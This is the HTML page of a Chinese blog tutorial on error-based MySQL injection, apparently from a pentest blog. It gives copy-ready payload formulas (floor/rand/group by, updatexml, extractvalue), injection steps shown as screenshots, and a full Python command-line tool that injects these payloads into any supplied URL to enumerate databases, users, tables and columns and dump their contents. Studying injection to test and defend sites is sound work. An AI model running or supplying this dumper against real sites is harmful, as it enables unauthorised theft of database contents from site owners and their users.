@@ -1,0 +1,975 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL注入之报错型注入 - Reber's Blog</title>
+  <meta name="keywords" content="渗透测试 漏洞挖掘 web安全 网络安全 python php linux">
+  <meta name="description" content="">
+  <meta name="author" content="reber">
+
+  
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="http://wyb0.com/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="http://wyb0.com/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="http://wyb0.com/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  <link rel="alternate" type="application/rss+xml" title="" href="http://wyb0.com/index.xml" />
+
+  
+  <link rel="stylesheet" href="http://wyb0.com/css/monokai-sublime.css" type="text/css">
+  <script src="http://wyb0.com/js/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+
+  
+  <link rel="shortcut icon" href="http://wyb0.com/img/favicon.ico" type="image/x-icon" />
+
+  <script src="//cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+
+</head>
+<body>
+
+
+
+<div class="reber">
+    
+<div class="head">
+    <h1 class="logo" id="logo">
+        <a href="http://wyb0.com/"><img src='http://wyb0.com/img/logo.png' width='70px'></a>
+    </h1>
+    <ul class="nav">
+        
+            
+                <li>
+                    <a href="http://wyb0.com/"><i class='fa fa-home fa-fw'></i>Home</a>
+            
+                </li>
+        
+            
+                <li>
+                    <a href="http://wyb0.com/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
+            
+                </li>
+        
+            
+                <li>
+                    <a href="http://wyb0.com/about/"><i class='fa fa-user fa-fw'></i>About</a>
+            
+                </li>
+        
+    </ul>
+</div>
+
+
+    <div class="main">
+        <div class="left">
+            <div>
+                <h2>SQL注入之报错型注入</h2>
+            </div>
+            <div class="cont">
+                
+                <div class="post-meta">
+                    <div style="padding:5px 5px 2px 0px;">
+                        <i class="fa fa-calendar fa-fw"></i>
+                        <time>2016-06-22</time>
+                    </div>
+
+                    
+
+                    <div style="padding:2px 5px 2px 0px;">
+                        
+                        
+                        
+                            <i class="fa fa-folder fa-fw"></i>
+                            
+                                <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>&nbsp;&#47;
+                            
+                                <a class="post-taxonomy-topic" href="http://wyb0.com/topics/sql-injection">SQL Injection</a>
+                            
+                        
+                        
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                        
+                        
+                        
+                            <i class="fa fa-tags fa-fw"></i>
+                            
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%B3%A8%E5%85%A5">注入</a>&nbsp;&#47;
+                            
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">报错注入</a>
+                            
+                        
+                        
+                    </div>
+                </div>
+                
+                
+
+<h3 id="0x00-前提:af30d448bff8d1d0bb03cb40c944803d">0x00 前提</h3>
+
+<blockquote>
+<pre><code>一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，
+它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解
+</code></pre>
+</blockquote>
+
+<h3 id="0x01-利用方式:af30d448bff8d1d0bb03cb40c944803d">0x01 利用方式</h3>
+
+<blockquote>
+<p>count(*)、floor()、rand()、group by不可或缺<br />
+报错注入用一个公式，只要套用公式即可，公式如下(后两个公式有32位的限制):<br />
+?id=2&rsquo; and (select 1 from <font color="00CDCD">(select <u>count(*),<b>concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x</b></u> from information_schema.tables group by x )a</font>
+)--+<br />
+?id=2&rsquo; and updatexml(1,concat(0x7e,(<font color="00CDCD">SELECT @@version</font>),0x7e),1)--+<br />
+?id=1&rsquo; and extractvalue(1, concat(0x7e, (<font color="00CDCD">select @@version</font>),0x7e))--+</p>
+</blockquote>
+
+<h3 id="0x02-公式解析:af30d448bff8d1d0bb03cb40c944803d">0x02 公式解析</h3>
+
+<blockquote>
+<pre><code>floor()是取整数
+rand()在0和1之间产生一个随机数
+rand(0)*2将取0到2的随机数
+floor(rand()*2)有两条记录就会报错
+floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的
+count(*)是用来统计结果的，相当于刷新一次结果
+group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1
+group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次
+</code></pre>
+</blockquote>
+
+<h3 id="0x03-注入步骤:af30d448bff8d1d0bb03cb40c944803d">0x03 注入步骤</h3>
+
+<ul>
+<li>得到闭合字符</li>
+<li>猜列数、尝试爆显示位</li>
+<li>得到数据库个数和数据库名</li>
+<li>得到表个数和表名</li>
+<li>得到列数量和列名</li>
+<li>得到列值</li>
+</ul>
+
+<h4 id="猜测闭合字符:af30d448bff8d1d0bb03cb40c944803d">猜测闭合字符</h4>
+
+<blockquote>
+<p>
+<div class="pure-u-1">
+  <img class="pure-img" src="http://wyb0.com/img/post/sqli5_get_closed_character.png" alt="得到闭合字符">
+</div>
+
+<br /><br />
+
+<div class="pure-u-1">
+  <img class="pure-img" src="http://wyb0.com/img/post/sqli5_check_closed_character.png" alt="确认闭合字符">
+</div>
+</p>
+</blockquote>
+
+<h4 id="猜测列数:af30d448bff8d1d0bb03cb40c944803d">猜测列数</h4>
+
+<blockquote>
+
+<div class="pure-u-1">
+  <img class="pure-img" src="http://wyb0.com/img/post/sqli5_order_by.png" alt="得到列数">
+</div>
+
+</blockquote>
+
+<h4 id="尝试得到显示位:af30d448bff8d1d0bb03cb40c944803d">尝试得到显示位</h4>
+
+<blockquote>
+
+<div class="pure-u-1">
+  <img class="pure-img" src="http://wyb0.com/img/post/sqli5_get_display_point.png" alt="尝试得到显示位">
+</div>
+
+</blockquote>
+
+<h4 id="报错得到数据库个数:af30d448bff8d1d0bb03cb40c944803d">报错得到数据库个数</h4>
+
+<blockquote>
+
+<div class="pure-u-1">
+  <img class="pure-img" src="http://wyb0.com/img/post/sqli5_get_db_num.png" alt="报错得到数据库个数">
+</div>
+
+</blockquote>
+
+<h4 id="报错得到数据库名:af30d448bff8d1d0bb03cb40c944803d">报错得到数据库名</h4>
+
+<blockquote>
+
+<div class="pure-u-1">
+  <img class="pure-img" src="http://wyb0.com/img/post/sqli5_get_db_name.png" alt="报错得到数据库名">
+</div>
+
+</blockquote>
+
+<h4 id="报错得到表名:af30d448bff8d1d0bb03cb40c944803d">报错得到表名</h4>
+
+<blockquote>
+<p>
+<div class="pure-u-1">
+  <img class="pure-img" src="http://wyb0.com/img/post/sqli5_get_table_num.png" alt="报错得到表的个数">
+</div>
+
+<br /><br />
+
+<div class="pure-u-1">
+  <img class="pure-img" src="http://wyb0.com/img/post/sqli5_get_table_name.png" alt="报错得到表名">
+</div>
+</p>
+</blockquote>
+
+<h4 id="报错得到列名:af30d448bff8d1d0bb03cb40c944803d">报错得到列名</h4>
+
+<blockquote>
+<p>
+<div class="pure-u-1">
+  <img class="pure-img" src="http://wyb0.com/img/post/sqli5_get_column_num.png" alt="报错得到列的个数">
+</div>
+
+<br /><br />
+
+<div class="pure-u-1">
+  <img class="pure-img" src="http://wyb0.com/img/post/sqli5_get_column_name1.png" alt="报错得到列名1">
+</div>
+
+<br /><br />
+
+<div class="pure-u-1">
+  <img class="pure-img" src="http://wyb0.com/img/post/sqli5_get_column_name2.png" alt="报错得到列名2">
+</div>
+</p>
+</blockquote>
+
+<h4 id="得到列值:af30d448bff8d1d0bb03cb40c944803d">得到列值</h4>
+
+<blockquote>
+<p>
+<div class="pure-u-1">
+  <img class="pure-img" src="http://wyb0.com/img/post/sqli5_get_column_value_num.png" alt="报错得到数据条数">
+</div>
+
+<br /><br />
+
+<div class="pure-u-1">
+  <img class="pure-img" src="http://wyb0.com/img/post/sqli5_get_column_value.png" alt="报错得到列的值">
+</div>
+</p>
+</blockquote>
+
+<h3 id="0x04-附上利用代码:af30d448bff8d1d0bb03cb40c944803d">0x04 附上利用代码</h3>
+
+<blockquote>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-  
+
+import re
+import urllib
+import urllib2
+import binascii
+from pyfiglet import figlet_format
+from optparse import OptionParser
+
+
+# --dbs url
+def getAllDatabases(url):
+    # print url
+    payload = &quot;' and(select 1 from(select+count(*),concat((select (select (select+concat(0x7e7e3a7e7e, count(distinct table_schema),0x7e7e3a7e7e) from information_schema.tables)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot;
+    payload = &quot;/**/&quot;.join(payload.split())
+    dbs_num_url = url + payload
+    # print dbs_num_url
+    response = urllib2.urlopen(dbs_num_url)
+    html = response.read()
+    # print html
+    # ~~:~~5~~:~~
+    dbs_num = int(re.search(r'~~:~~(\d*?)~~:~~', html).group(1))
+    print &quot;database num: %d&quot; % dbs_num
+    print &quot;database name: &quot;
+    for index in xrange(0,dbs_num):
+        payload = &quot;' and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e7e3a7e7e, table_schema, 0x7e7e3a7e7e) from information_schema.tables limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % index
+        payload = &quot;/**/&quot;.join(payload.split())
+        db_name_url = url + payload
+        response = urllib2.urlopen(db_name_url)
+        html = response.read()
+        db_name = re.search(r'~~:~~(.*?)~~:~~', html).group(1)
+        print &quot;\t%s&quot; % db_name
+
+def getCurrentDb(url):
+    # print &quot;CurrentDb is: aaaa&quot;
+    # print url
+
+    current_db_name_url = url + &quot;'+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/database()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&quot;
+    response = urllib2.urlopen(current_db_name_url)
+    html = response.read()
+    current_db_name = re.search(r'~~:~~(.*?)~~:~~', html).group(1)
+    print &quot;Current database is: %s&quot; % current_db_name
+
+def getCurrentUser(url):
+    db_name_url = url + &quot;'+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/user()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&quot;
+    response = urllib2.urlopen(db_name_url)
+    html = response.read()
+    user_name = re.search(r'~~:~~(.*?)~~:~~', html).group(1)
+    print &quot;Current user is: %s&quot; % user_name
+
+# --tables -D database url
+def getAllTablesByDb(url,db_name):
+    # print db_name
+    # print url
+    db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
+    # print db_name_hex
+    tables_num_url = url + &quot;'+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/count(table_name),/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=%s))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&quot; % db_name_hex
+    response = urllib2.urlopen(tables_num_url)
+    html = response.read()
+    # print html
+    tables_num = int(re.search(r'~~:~~(\d*?)~~:~~', html).group(1))
+    # print tables_num
+    print &quot;%s has %d table&quot; % (db_name, tables_num)
+    print &quot;table name: &quot;
+    for index in xrange(0,tables_num):
+        tables_name_url = url + &quot;'+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/table_name,/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=%s/**/limit/**/%d,1))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&quot; % (db_name_hex, index)
+        response = urllib2.urlopen(tables_name_url)
+        html = response.read()
+        # print html
+        table_name = re.search(r'~~:~~(.*?)~~:~~',html).group(1)
+        print &quot;\t%s&quot; % table_name
+
+def getAllColumnsByTable(url,table_name,db_name):
+    db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
+    table_name_hex = &quot;0x&quot; + binascii.b2a_hex(table_name)
+    payload = &quot;'+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(column_name),0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (table_name_hex,db_name_hex)
+    # print payload
+    payload = &quot;/**/&quot;.join(payload.split())
+    column_num_url = url + payload
+    response = urllib2.urlopen(column_num_url)
+    html = response.read()
+    column_num = int(re.search(r'~~:~~(\d*?)~~:~~',html).group(1))
+    # print column_num
+    print &quot;Table %s of the %s has %d columns&quot; % (table_name,db_name,column_num)
+    print &quot;Table %s contains the column name:&quot; % table_name
+    for index in xrange(0,column_num):
+        payload = &quot;'+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,column_name,0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (table_name_hex,db_name_hex,index)
+        payload = &quot;/**/&quot;.join(payload.split())
+        # print payload
+        column_value_url = url + payload
+        response = urllib2.urlopen(column_value_url)
+        html = response.read()
+        # print html
+        column_name = re.search(r'~~:~~(.*?)~~:~~',html).group(1)
+        print &quot;\t%s&quot; % column_name
+
+
+def getAllcontent(url,column_name,table_name,db_name):
+    # print url
+    # print column_name
+    # print table_name
+    # print db_name
+    column_name = column_name.split(',')
+    num_column = len(column_name) #想得到的字段的个数
+    # print column_name
+    # print num_column
+
+    payload = &quot;'+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(*),0x7e7e3a7e7e) from %s.%s)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (db_name,table_name)
+    # print payload
+    payload = &quot;/**/&quot;.join(payload.split())
+    column_value_url = url + payload
+    response = urllib2.urlopen(column_value_url)
+    html = response.read()
+    # print html
+    column_value_num = int(re.search(r'~~:~~(\d*?)~~:~~',html).group(1))
+    print &quot;Table %s has %d columns&quot; % (table_name,column_value_num)
+    print &quot;Table %s column values:&quot; % table_name
+
+    title = &quot;\t&quot;
+    str_value = &quot;0x7e7e3a7e7e,&quot;
+    for x in xrange(0,num_column):
+        title += &quot;%-15s&quot; % column_name[x]
+        str_value += &quot;%s,0x20,&quot; % column_name[x]
+    str_value = &quot;,&quot;.join(str_value.split(',')[0:-2]) +&quot;,0x7e7e3a7e7e&quot;
+    # print str_value
+    
+    print title
+    for index in xrange(0,column_value_num):
+        payload = &quot;'+and(select 1 from(select count(*),concat((select (select ( select concat(%s) from %s.%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (str_value,db_name,table_name,index)
+        # print payload
+        payload = &quot;/**/&quot;.join(payload.split())
+        value_url = url + payload
+        response = urllib2.urlopen(value_url)
+        html = response.read()
+        # print html
+        value = re.search(r'~~:~~(.*?)~~:~~',html).group(1).split()
+        # print value
+        stri = &quot;\t&quot;
+        # print len(value)
+        if len(value)==0:
+            print &quot;&quot;
+        else:
+            for x in xrange(0,num_column):
+                stri += &quot;%-15s&quot; % value[x]
+            print stri
+
+def main():
+    print figlet_format(&quot;sqli-error&quot;)
+    parser = OptionParser()
+    parser.add_option(&quot;-u&quot;,&quot;--URL&quot;,action=&quot;store&quot;,
+              type=&quot;string&quot;,dest=&quot;url&quot;,
+              help=&quot;get url&quot;)
+    parser.add_option(&quot;-D&quot;,&quot;--DB&quot;,action=&quot;store&quot;,
+              type=&quot;string&quot;,dest=&quot;db_name&quot;,
+              help=&quot;get database name&quot;)
+    parser.add_option(&quot;-T&quot;,&quot;--TBL&quot;,action=&quot;store&quot;,
+              type=&quot;string&quot;,dest=&quot;table_name&quot;,
+              help=&quot;get table name&quot;)
+    parser.add_option(&quot;-C&quot;,&quot;--COL&quot;,action=&quot;store&quot;,
+              type=&quot;string&quot;,dest=&quot;column_name&quot;,
+              help=&quot;get column name&quot;)
+
+    parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,
+              dest=&quot;dbs&quot;,help=&quot;get all database name&quot;)
+    parser.add_option(&quot;--current-db&quot;,action=&quot;store_true&quot;,
+              dest=&quot;current_db&quot;,help=&quot;get current database name&quot;)
+    parser.add_option(&quot;--current-user&quot;,action=&quot;store_true&quot;,
+              dest=&quot;current_user&quot;,help=&quot;get current user name&quot;)
+    parser.add_option(&quot;--tables&quot;,action=&quot;store_true&quot;,
+              dest=&quot;tables&quot;,help=&quot;get tables from databases&quot;)
+    parser.add_option(&quot;--columns&quot;,action=&quot;store_true&quot;,
+              dest=&quot;columns&quot;,help=&quot;get columns from tables&quot;)
+    parser.add_option(&quot;--dump&quot;,action=&quot;store_true&quot;,
+              dest=&quot;dump&quot;,help=&quot;get value&quot;)
+    (options,args) = parser.parse_args()
+
+
+    if options == None or options.url == None:
+        parser.print_help()
+    elif options.dump and options.column_name and options.table_name and options.db_name:
+        getAllcontent(options.url,options.column_name,options.table_name,options.db_name)
+    elif options.table_name and options.db_name:
+        getAllColumnsByTable(options.url,options.table_name,options.db_name)
+    elif options.db_name:
+        getAllTablesByDb(options.url,options.db_name)    
+    elif options.dbs:
+        getAllDatabases(options.url)
+    elif options.current_db:
+        getCurrentDb(options.url)
+    elif options.current_user:
+        getCurrentUser(options.url)
+    elif options.url:
+        print &quot;you input: sqli-error.py -u www.xxx.com/?id=xx&quot;
+
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+</blockquote>
+
+
+                <br /><br />
+                <font color="FF0000">若未作声明则文章版权归本人所有，转载请注明原文链接：</font>
+                <script>
+                    var link = decodeURI(window.location.href);
+                    var url = '<a href="' + link + '">'+link+'</a>';
+                    document.write(url);
+                </script>
+
+                
+<div class="prev-next-post pure-g">
+  <div class="pure-u-1-24" style="text-align: left;">
+    
+    <a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/"><i class="fa fa-chevron-left"></i></a>
+    
+  </div>
+  <div class="pure-u-10-24">
+    
+    <nav class="prev">
+      <a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/">SQL注入之联合查询</a>
+    </nav>
+    
+  </div>
+  <div class="pure-u-2-24">
+    &nbsp;
+  </div>
+  <div class="pure-u-10-24">
+    
+    <nav class="next">
+      <a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5/">SQL注入之布尔型注入</a>
+    </nav>
+    
+  </div>
+  <div class="pure-u-1-24" style="text-align: right;">
+    
+    <a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5/"><i class="fa fa-chevron-right"></i></a>
+    
+  </div>
+</div>
+
+
+            </div>
+        </div>
+        <div class="right">
+            <div>
+                <br>
+                
+
+
+
+<div>
+    <h2 class="asidetitle">Categories</h2>
+    <ul style="margin-left:10px;left:10px">
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/ajax" title="ajax">ajax<sup>3</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/config" title="config">config<sup>1</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/csrf" title="csrf">csrf<sup>1</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/git" title="git">git<sup>7</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/javascript" title="javascript">javascript<sup>1</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/linux" title="linux">linux<sup>18</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/miscellanea" title="miscellanea">miscellanea<sup>15</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/pentest" title="pentest">pentest<sup>53</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/php" title="php">php<sup>14</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/plan" title="plan">plan<sup>1</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/python" title="python">python<sup>32</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/server" title="server">server<sup>8</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/sql-injection" title="sql-injection">sql-injection<sup>6</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/ssrf" title="ssrf">ssrf<sup>1</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/wireless" title="wireless">wireless<sup>1</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/xml" title="xml">xml<sup>1</sup></a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/xss" title="xss">xss<sup>3</sup></a></li>
+        
+    </ul>
+</div>
+
+
+                
+
+
+
+<div>
+    <h2 class="asidetitle">Tags</h2>
+        <div style="padding:5px 0px 10px 10px;">
+        
+            <a href="http://wyb0.com/tags/ajax" title="ajax" style="background-color:#23b7e5;color:#080808;line-height:25px;">ajax<sup>3</sup></a>
+        
+            <a href="http://wyb0.com/tags/apache" title="apache" style="background-color:#23b7e5;color:#080808;line-height:25px;">apache<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/asp" title="asp" style="background-color:#23b7e5;color:#080808;line-height:25px;">asp<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/awk" title="awk" style="background-color:#23b7e5;color:#080808;line-height:25px;">awk<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/blog" title="blog" style="background-color:#23b7e5;color:#080808;line-height:25px;">blog<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/burpsuite" title="burpsuite" style="background-color:#23b7e5;color:#080808;line-height:25px;">burpsuite<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/cdn" title="cdn" style="background-color:#23b7e5;color:#080808;line-height:25px;">cdn<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/cgi" title="cgi" style="background-color:#23b7e5;color:#080808;line-height:25px;">cgi<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/cmd" title="cmd" style="background-color:#23b7e5;color:#080808;line-height:25px;">cmd<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/config" title="config" style="background-color:#23b7e5;color:#080808;line-height:25px;">config<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/cookie" title="cookie" style="background-color:#23b7e5;color:#080808;line-height:25px;">cookie<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/csrf" title="csrf" style="background-color:#23b7e5;color:#080808;line-height:25px;">csrf<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/c%e8%af%ad%e8%a8%80" title="c语言" style="background-color:#23b7e5;color:#080808;line-height:25px;">c语言<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/dedecms" title="dedecms" style="background-color:#23b7e5;color:#080808;line-height:25px;">dedecms<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/des" title="des" style="background-color:#23b7e5;color:#080808;line-height:25px;">des<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/dict" title="dict" style="background-color:#23b7e5;color:#080808;line-height:25px;">dict<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/dmz" title="dmz" style="background-color:#23b7e5;color:#080808;line-height:25px;">dmz<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/dns" title="dns" style="background-color:#23b7e5;color:#080808;line-height:25px;">dns<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/ettercap" title="ettercap" style="background-color:#23b7e5;color:#080808;line-height:25px;">ettercap<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/fastcgi" title="fastcgi" style="background-color:#23b7e5;color:#080808;line-height:25px;">fastcgi<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/ftp" title="ftp" style="background-color:#23b7e5;color:#080808;line-height:25px;">ftp<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/git" title="git" style="background-color:#23b7e5;color:#080808;line-height:25px;">git<sup>4</sup></a>
+        
+            <a href="http://wyb0.com/tags/github" title="github" style="background-color:#23b7e5;color:#080808;line-height:25px;">github<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/gitlab" title="gitlab" style="background-color:#23b7e5;color:#080808;line-height:25px;">gitlab<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/grep" title="grep" style="background-color:#23b7e5;color:#080808;line-height:25px;">grep<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/hugo" title="hugo" style="background-color:#23b7e5;color:#080808;line-height:25px;">hugo<sup>3</sup></a>
+        
+            <a href="http://wyb0.com/tags/hydra" title="hydra" style="background-color:#23b7e5;color:#080808;line-height:25px;">hydra<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/ibus" title="ibus" style="background-color:#23b7e5;color:#080808;line-height:25px;">ibus<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/iis" title="iis" style="background-color:#23b7e5;color:#080808;line-height:25px;">iis<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/information_schema" title="information_schema" style="background-color:#23b7e5;color:#080808;line-height:25px;">information_schema<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/into-outfile" title="into-outfile" style="background-color:#23b7e5;color:#080808;line-height:25px;">into-outfile<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/io" title="io" style="background-color:#23b7e5;color:#080808;line-height:25px;">io<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/iptables" title="iptables" style="background-color:#23b7e5;color:#080808;line-height:25px;">iptables<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/javascript" title="javascript" style="background-color:#23b7e5;color:#080808;line-height:25px;">javascript<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/json" title="json" style="background-color:#23b7e5;color:#080808;line-height:25px;">json<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/jsp" title="jsp" style="background-color:#23b7e5;color:#080808;line-height:25px;">jsp<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/linux" title="linux" style="background-color:#23b7e5;color:#080808;line-height:25px;">linux<sup>8</sup></a>
+        
+            <a href="http://wyb0.com/tags/list" title="list" style="background-color:#23b7e5;color:#080808;line-height:25px;">list<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/load_file" title="load_file" style="background-color:#23b7e5;color:#080808;line-height:25px;">load_file<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/logging" title="logging" style="background-color:#23b7e5;color:#080808;line-height:25px;">logging<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/markdown" title="markdown" style="background-color:#23b7e5;color:#080808;line-height:25px;">markdown<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/metasploit" title="metasploit" style="background-color:#23b7e5;color:#080808;line-height:25px;">metasploit<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/miscellanea" title="miscellanea" style="background-color:#23b7e5;color:#080808;line-height:25px;">miscellanea<sup>2</sup></a>
+        
+            <a href="http://wyb0.com/tags/mysql" title="mysql" style="background-color:#23b7e5;color:#080808;line-height:25px;">mysql<sup>10</sup></a>
+        
+            <a href="http://wyb0.com/tags/nessus" title="nessus" style="background-color:#23b7e5;color:#080808;line-height:25px;">nessus<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/nginx" title="nginx" style="background-color:#23b7e5;color:#080808;line-height:25px;">nginx<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/nmap" title="nmap" style="background-color:#23b7e5;color:#080808;line-height:25px;">nmap<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/openpyxl" title="openpyxl" style="background-color:#23b7e5;color:#080808;line-height:25px;">openpyxl<sup>1</sup></a>
+        
+            <a href="http://wyb0.com/tags/optparse" title="optparse" style="background-color:#23b7e5;color:#080808;line-height:25px;">optparse<sup>1</sup></a>
+        
